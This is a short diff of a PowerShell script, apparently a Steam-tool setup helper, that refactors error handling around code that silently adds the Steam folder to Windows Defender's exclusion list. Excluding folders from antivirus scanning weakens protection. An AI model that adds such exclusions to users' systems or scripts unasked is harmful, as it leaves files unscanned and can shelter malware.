@@ -114,22 +114,22 @@ function Log {
 }
 
 $steamExclusion = "C:\Program Files (x86)\Steam"
-$exclusions = (Get-MpPreference).ExclusionPath
 
-if ($exclusions -contains $steamExclusion) {
-    Log "INFO" (L exclusion_in_pc)
-}
-else {
-    Try {
+try {
+    $exclusions = @((Get-MpPreference).ExclusionPath)
+
+    if ($exclusions -contains $steamExclusion) {
+        Log "INFO" (L "exclusion_in_pc")
+    }
+    else {
         Add-MpPreference -ExclusionPath $steamExclusion -ErrorAction Stop
-        Log "LOG" (L Exclusion)
-    }
-    Catch {
-        Log "ERR" (L err_anti)
+        Log "LOG" (L "Exclusion")
     }
 }
-
-
+catch {
+    Log "ERR" (L "err_anti")
+    Log "ERR" $_.Exception.Message
+}
 
 Log "VERSION" "$version"
 
